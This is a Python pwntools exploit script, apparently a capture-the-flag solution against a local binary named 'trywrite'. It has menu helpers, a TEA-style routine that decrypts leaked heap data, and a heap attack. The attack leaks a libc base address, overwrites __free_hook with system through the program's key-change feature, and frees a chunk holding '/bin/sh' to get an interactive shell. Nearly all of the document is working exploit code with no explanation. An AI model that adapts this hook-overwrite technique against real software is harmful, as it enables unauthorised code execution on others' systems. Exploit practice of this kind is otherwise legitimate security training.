#coding = utf-8
from pwn import *
from ctypes import *
local = 1
exec_file="./trywrite"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("")

def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x0000000000013A3)
    b *(0x555555554000+0x0000000000014E2)
    b *(0x555555554000+0x00000000000159F)
    b *(0x555555554000+0x000000000001777)
    b *(0x555555554000+0x000000000001017)
    ''')
def decode(first,second,key):
    first=c_uint32(first)
    second=c_uint32(second)
    v5=c_uint32(0xe3779b90)
    for i in range(16):
        second.value -= (first.value + v5.value) ^ (16 * first.value + key[2]) ^ ((first.value >> 5) + key[3])
        first.value -= (second.value + v5.value) ^ (16 * second.value + key[0]) ^ ((second.value >> 5) + key[1])
        v5.value -= 0x9E3779B9
    return struct.pack("@II",first.value,second.value)
def __decode(data,key):
    key=struct.unpack("@IIII",key)
    length=int(len(data)/4)
    data=struct.unpack('@'+"I"*length,data)
    temp=""
    for i in range(length/2):
        temp+=decode(data[2*i],data[2*i+1],key)
    return temp
def menu(idx):
    a.sendlineafter("command>> \n",str(idx))
def add(key,data):
    menu(1)
    a.sendafter("Please tell me the key:\n",key)
    a.sendafter("e the date:",data)
def delete(idx):
    menu(3)
    a.sendlineafter("Please tell me the index:\n",str(idx))
def show(idx):
    menu(2)
    a.sendlineafter("Please tell me the index:\n",str(idx))
def change(offset_1,offset_2,new_key):
    menu(4)
    a.sendlineafter("first key is from your heap:\n",str(offset_1))
    a.sendlineafter("first key:\n",str(offset_2))
    a.sendafter("Please tell me the new key:\n",new_key)
def init(heap):
    a.sendlineafter("Please tell me where is your heap:\n",heap)
    a.sendlineafter("Do you want to tell me your name now?(Y/N)\n","Y")
    a.sendline('AAA')
    

heap_addr=0x1070000
key='A'*16
init(str(0xFF0000))

for i in range(9):
    add(key,"A\n")
for i in range(8):
    delete(i)
add(key,";/bin/sh\x00\n")
for i in range(7):
    add(key,'\n')
#debug()
show(7)
data=a.recv(0x80)
data = __decode(data, key)
libc_base = u64(data[0:8])- 0x3ebc00
success("libc_base ==> 0x%x"%libc_base)
change(0x69,0,'\x00\x07\x01\x00\x00\x00\x00\x69\x00\x07\x01'.ljust(16,'\x00'))
#debug()
__free_hook=libc_base+libc.symbols["__free_hook"]
system_addr=libc_base+libc.symbols["system"]
change(0x50,0,p64(__free_hook)+'\n')

change(__free_hook-heap_addr,heap_addr+0x20000+1,p64(system_addr)+'\n')
delete(0)
a.interactive()